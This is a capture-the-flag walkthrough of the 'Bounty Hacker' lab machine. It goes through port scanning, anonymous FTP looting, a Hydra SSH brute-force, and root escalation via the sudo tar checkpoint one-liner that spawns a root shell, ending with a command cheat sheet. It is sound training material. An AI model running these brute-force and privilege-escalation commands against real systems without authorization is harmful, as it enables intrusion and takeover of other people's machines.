# Bounty Hacker — Study Notes

> A CTF walkthrough with the *why* behind each step, not just the commands.
> Target machine IP used in this session: `10.129.155.178`

---

## The 5-stage kill chain we followed

1. **Recon** — scan for open ports/services
2. **Enumeration** — anonymous FTP → find files
3. **Credential attack** — Hydra brute-forces SSH
4. **Initial access** — SSH login → user flag
5. **Privilege escalation** — abuse a `sudo` binary → root flag

This "recon → enumerate → exploit → foothold → escalate" pattern is the backbone of almost every box you'll ever do. Learn the *shape*, not just the commands.

---

## Stage 1 — Recon (port scanning)

```bash
nmap -sV 10.129.155.178
```

- `-sV` = detect **service versions** on each open port.
- Ports that mattered here:
  - **21 / FTP** (vsFTPd 3.0.5)
  - **22 / SSH**
  - **80 / HTTP** (web server)

**Lesson:** Always scan first. Every later step depends on knowing *what's listening*. An open port is a door — you're mapping the doors before trying the handles.

---

## Stage 2 — Enumeration (anonymous FTP)

FTP was configured to allow **anonymous login** — a common misconfiguration.

```bash
ftp 10.129.155.178
# Name: anonymous
# Password: (just press Enter — blank)
```

Inside the FTP session:

```
ftp> ls          # list files → locks.txt, task.txt
ftp> get task.txt    # downloads to your local folder
ftp> get locks.txt
ftp> bye         # exit
```

### Reading files WITHOUT saving them
`cat` does **not** work at the `ftp>` prompt — that's an FTP shell, not bash. Two ways to just read:

```
ftp> get task.txt -          # dash = print to screen, save nothing
```
or from a normal terminal:
```bash
curl ftp://10.129.155.178/task.txt --user anonymous:
```

### What the files gave us
- **`task.txt`** → a note **signed by `lin`** at the bottom.
  - Answers *"Who wrote the task list?"* → **lin**
  - More importantly: **lin = a valid username** on the box.
- **`locks.txt`** → a list of ~26 candidate passwords → our **wordlist**.

**Lesson:** Loot isn't just flags. A username here, a password list there — enumeration is about collecting *ingredients* for the next stage.

---

## Stage 3 — Credential attack (Hydra)

We had a **username** (`lin`) and a **password list** (`locks.txt`). Perfect setup for a targeted brute-force against SSH.

```bash
hydra -l lin -P locks.txt ssh://10.129.155.178
```

| Flag | Meaning |
|------|---------|
| `-l lin` | single **login** name (lowercase L) |
| `-P locks.txt` | **P**assword list file (uppercase P) |
| `ssh://10.129.155.178` | target service + host |

Remember the case rule:
- lowercase `-l` / `-p` = a **single** value
- uppercase `-L` / `-P` = a **list/file**

Hydra prints the hit:
```
[22][ssh] host: 10.129.155.178  login: lin  password: ***************
```
→ that `password:` value answers *"What is the users password?"*

**Lesson:** Brute-forcing is only realistic when it's **targeted** — a known user + a small curated list, not the whole rockyou.txt against random names.

---

## Stage 4 — Initial access (SSH → user flag)

```bash
ssh lin@10.129.155.178
# enter the password Hydra found
cat user.txt        # first flag
```

You're now a **normal (non-root) user**. Foothold achieved.

---

## Stage 5 — Privilege escalation (sudo + GTFOBins)

### Step 1: What can I run as root?
```bash
sudo -l
```
Output:
```
User lin may run the following commands on ...:
    (root) /bin/tar
```
→ `lin` can run **`tar`** as root, without a password prompt for that command.

### Step 2: Look it up on GTFOBins
[https://gtfobins.github.io](https://gtfobins.github.io) → search `tar` → it has a **sudo** entry. `tar` can execute commands via its checkpoint feature.

### Step 3: The exploit
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Breakdown:

| Part | What it does |
|------|--------------|
| `sudo` | run as root (the one thing we're allowed) |
| `tar -c` | **create** an archive |
| `-f /dev/null` | write the archive to the trash (we don't want a real archive) |
| `/dev/null` | the "content" to archive — also throwaway, just a pretext |
| `--checkpoint=1` | trigger a checkpoint after processing 1 file |
| `--checkpoint-action=exec=/bin/sh` | **on checkpoint, run `/bin/sh`** ← the actual payload |

Because `tar` is running **as root**, the shell it spawns is **also root**.

### Step 4: Grab the root flag
```bash
whoami            # -> root
cat /root/root.txt   # final flag
```

---

## The big takeaway: why GTFOBins works

When you give a program `sudo` rights, you grant root to **everything that program can do — not just its intended job.**

Many everyday tools can read files or spawn shells as a side feature:
`tar`, `vim`, `find`, `less`, `nano`, `awk`, `nmap`, `python`, and more.

So the privilege-escalation recipe is almost mechanical:

1. `sudo -l` → which binary can I run as root?
2. Search that binary on **GTFOBins**.
3. Copy the shell/sudo one-liner it gives you.

---

## Command cheat sheet

```bash
# Recon
nmap -sV <IP>

# FTP (anonymous)
ftp <IP>                          # user: anonymous, pass: (blank)
ftp> get <file>                   # download
ftp> get <file> -                 # print to screen, save nothing
curl ftp://<IP>/<file> --user anonymous:

# Brute force SSH
hydra -l <user> -P <wordlist> ssh://<IP>

# Login
ssh <user>@<IP>

# Priv esc recon
sudo -l                           # then look the binary up on GTFOBins
```

---

## Key mindset lessons

- **Scan before you touch anything.** You can't attack a service you don't know exists.
- **Misconfigurations > exploits.** Anonymous FTP and an over-permissive `sudo` rule beat any fancy CVE here.
- **Every artifact is a lead.** A signature became a username; a text file became a wordlist.
- **Escalation is a lookup, not magic.** `sudo -l` + GTFOBins solves a huge share of Linux boxes.

*Machine complete: user flag + root flag captured.* ✅
